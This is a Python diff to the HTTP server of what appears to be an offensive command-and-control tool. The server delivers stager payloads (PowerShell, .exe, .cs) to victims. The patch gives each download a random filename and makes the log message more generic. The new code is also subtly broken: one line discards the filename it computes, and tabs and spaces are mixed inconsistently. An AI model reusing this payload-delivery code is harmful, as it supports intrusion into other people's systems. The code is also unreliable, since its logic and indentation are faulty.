@@ -29,14 +29,17 @@ def HTTPDFactory(config):
 
             super(HTTPD, self).__init__(*args, **kwargs)
 
-        def set_http_headers(self, force_download = False):
+        def set_http_headers(self, force_download = False, filename = None):
             self.send_response(200)
 	    self.set_custom_headers()
             if force_download:
                 self.send_header("Content-Type", "application/octet-stream")
-                self.send_header("Content-Disposition", 'attachment; filename="%s"' % self.path.split("/", 1)[1].replace("/exe/", ".exe").replace("/cs/", ".cs").replace("/ps/", ".ps1"))
-            else:
-                self.send_header("Content-Type", "text/html")
+	        if filename == None:
+		    self.path.rsplit("/", 1)[1]
+		if filename:
+	            self.send_header("Content-Disposition", 'attachment; filename="%s"' % filename)
+	    else:
+               self.send_header("Content-Type", "text/html")
             self.end_headers()
 
         def set_json_header(self):
@@ -112,8 +115,9 @@ def HTTPDFactory(config):
             path = self.path.split("/")[-1]
             payload_path = self.path.split("/")
             if payload_path[1] == self.config.get("http-download-path"):
+		filename = Utils.gen_str(12)
 		force_download = True
-                Log.log_event("Download Stager", "PowerShell stager was fetched from %s (%s)" % (self.client_address[0], self.address_string()))
+                Log.log_event("Download Stager", "Stager was fetched from %s (%s)" % (self.client_address[0], self.address_string()))
 		payload = Payload(self.config)
 
 		if len(payload_path) > 3:
@@ -130,7 +134,7 @@ def HTTPDFactory(config):
             else:
                 self.output = Utils.load_file("html/%s" % self.config.get("http-default-404"))
                 Log.log_error("Invalid request got a GET request", self.path)
-            self.return_data(force_download)
+            self.return_data(force_download, filename)
 
         def do_OPTIONS(self):
              self.send_response(200, "OK")
@@ -140,8 +144,8 @@ def HTTPDFactory(config):
              self.output = "OK"
              self.return_json()
 
-        def return_data(self, force_download = False):
-            self.set_http_headers(force_download)
+        def return_data(self, force_download = False, filename = None):
+            self.set_http_headers(force_download, filename)
             self.wfile.write(self.output)
 
         def return_json(self):
